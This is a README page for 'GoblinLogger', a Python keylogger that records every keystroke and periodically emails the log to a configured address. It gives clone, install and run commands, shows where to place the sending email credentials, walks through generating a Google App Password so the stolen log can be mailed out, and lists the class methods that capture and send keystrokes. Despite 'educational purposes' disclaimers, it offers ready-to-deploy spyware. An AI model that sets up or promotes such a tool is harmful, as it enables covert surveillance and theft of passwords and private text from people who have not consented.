<h1>GoblinLogger</h1>
<p>GoblinLogger is a simple yet effective keylogger implemented in Python. It captures keystrokes and periodically sends the log to a specified email address. This tool is intended for educational purposes and should not be used for malicious activities.</p>

<h2>Features</h2>
<ul>
   <li>Logs all keystrokes including special keys.</li>
   <li>Periodically sends the log to an email address.</li>
   <li>Uses threading to ensure continuous logging and reporting.</li>
 </ul>

<h2>Requirements</h2>
    <ul>
        <li>Python 3.x</li>
        <li><code>pynput</code> library</li>
        <li><code>smtplib</code> library</li>
    </ul>

  <h2>Installation</h2>
    <ol>
        <li>Clone the repository:
            <pre><code>git clone https://github.com/goro-dim/k_logger
cd k_logger</code></pre>
        </li>
        <li>Install the required Python libraries:
            <pre><code>pip install pynput</code></pre>
        </li>
    </ol>

  <h2>Usage</h2>
    <ol>
        <li>Edit the <code>k_logger.py</code> file to include your email address and password:
            <pre><code>my_keylogger = GoblinLogger.Keylogger(120, "your_email@gmail.com", "your_password")</code></pre>
        </li>
        <li>Run the keylogger:
            <pre><code>python k_logger.py</code></pre>
        </li>
    </ol>
<h2>Generating a Google App Password</h2>
<p>For security reasons, you cannot use your Google account password directly in applications like this keylogger. Instead, you need to generate an App Password. Follow these steps to create one:</p>
<ol>
    <li>Visit your Google Account at <a href="https://myaccount.google.com" target="_blank">https://myaccount.google.com</a>.</li>
    <li>Navigate to the "Security" section.</li>
    <li>Under the "Signing in to Google" subsection:
        <ul>
            <li>Ensure that 2-Step Verification is enabled.</li>
            <li>Click on "App Passwords."</li>
        </ul>
    </li>
    <li>Re-enter your Google account password if prompted.</li>
    <li>Under the "Select app" dropdown, choose "Other (Custom name)" and enter a name for your application (e.g., "GoblinLogger").</li>
    <li>Click "Generate" to create a new App Password.</li>
    <li>Copy the generated App Password and paste it into the appropriate field in your code where the password is required.</li>
</ol>
<p>This App Password will allow your application to authenticate with your Google account securely.</p>

  <h2>File Descriptions</h2>
    <h3>GoblinLogger.py</h3>
    <p>This file contains the <code>Keylogger</code> class with the following methods:</p>
    <ul>
        <li><code>__init__(self, time_interval, email, password)</code>: Initializes the keylogger with a specified time interval, email, and password.</li>
        <li><code>append_to_log(self, string)</code>: Appends a string to the log.</li>
        <li><code>process_key_press(self, key)</code>: Processes each key press and updates the log.</li>
        <li><code>report(self)</code>: Sends the current log via email and resets the log.</li>
        <li><code>send_mail(self, email, password, message)</code>: Sends an email with the given message.</li>
        <li><code>start(self)</code>: Starts the keylogger and begins logging and reporting.</li>
    </ul>

  <h3>k_logger.py</h3>
    <p>This file initializes and starts the <code>Keylogger</code> instance. Edit this file to set your email configuration.</p>

   <h2>Important Notice</h2>
    <p>This tool is intended for educational purposes only. Unauthorized use of this keylogger to capture keystrokes without the user's consent is illegal and unethical. The author is not responsible for any misuse of this tool.</p>

